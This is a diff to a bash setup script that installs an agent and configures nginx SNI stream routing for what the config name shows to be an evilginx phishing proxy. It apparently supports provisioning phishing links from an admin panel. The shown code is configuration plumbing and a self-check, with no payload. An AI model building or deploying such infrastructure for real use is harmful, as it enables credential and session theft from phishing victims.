@@ -119,8 +119,22 @@ fi
 [[ -d "$AGENT_DIR" ]] || { echo "ERROR: agent code missing (expected at $AGENT_DIR)" >&2; exit 1; }
 
 echo "==> Step 4/6  nginx: top-level stream include (agent writes SNI map here)"
+# Idempotently add a `stream {}` block that includes our SNI map. Insert it
+# *before* `http {` so it never lands inside another block regardless of how
+# the default nginx.conf is laid out. ssl_preread lives in the stream context,
+# so this include is what lets the agent's SNI routing config load.
 if ! grep -q "include $NGINX_STREAM_DIR/\*.conf;" /etc/nginx/nginx.conf; then
-    sed -i "s#^}\$#}\n\nstream {\n    include $NGINX_STREAM_DIR/*.conf;\n}#" /etc/nginx/nginx.conf
+    awk '
+      /^[[:space:]]*http[[:space:]]*\{/ && !done {
+        print "stream {"
+        print "    include '"$NGINX_STREAM_DIR"'/*.conf;"
+        print "}"
+        print ""
+        done=1
+      }
+      { print }
+    ' /etc/nginx/nginx.conf > /etc/nginx/nginx.conf.tmp && \
+    mv /etc/nginx/nginx.conf.tmp /etc/nginx/nginx.conf
 fi
 
 # Disable the default site so it does not bind 0.0.0.0:80 (which would block
@@ -177,6 +191,25 @@ echo "==> Step 6/6  verify"
 sleep 6
 systemctl --no-pager -l status "$LABEL" --no-pager | head -n 12 || true
 journalctl -u "$LABEL" -n 10 --no-pager || true
+
+# Self-check: confirm the run-critical bits are in place so a misconfiguration
+# fails loudly at setup time instead of after a link is provisioned.
+echo "==> Self-check"
+NGINX_CONF_CHECK="$NGINX_STREAM_DIR/evilginx-sni.conf"
+AGENT_ENV_CHECK="$ENV_FILE"
+ok=1
+grep -q "AGENT_DEVELOPER=1" "$AGENT_ENV_CHECK" 2>/dev/null || { echo "FAIL: AGENT_DEVELOPER=1 not set in $AGENT_ENV_CHECK" >&2; ok=0; }
+grep -q 'load_module.*ngx_stream_module.so' /etc/nginx/nginx.conf 2>/dev/null || { echo "FAIL: stream module not loaded" >&2; ok=0; }
+grep -q "ssl_preread" "$NGINX_CONF_CHECK" 2>/dev/null || { echo "WARN: no SNI map yet at $NGINX_CONF_CHECK (written on first provision)" >&2; }
+grep -q '^\s*load_module.*ngx_stream_ssl_preread_module.so' /etc/nginx/nginx.conf 2>/dev/null || \
+    grep -q 'ssl_preread' /etc/nginx/nginx.conf 2>/dev/null || \
+    { echo "WARN: ssl_preread module/use not detected" >&2; }
+if [[ "$ok" == "0" ]]; then
+    echo "ERROR: bootstrap self-check failed — fix the above before provisioning links." >&2
+    exit 1
+fi
+echo "Self-check passed."
+
 echo
 echo "Agent installed. Open the admin panel -> VPS page and confirm '$AGENT_VPS_ID' flips to"
 echo "online (heartbeats every ~5s). If it stays offline, check:"
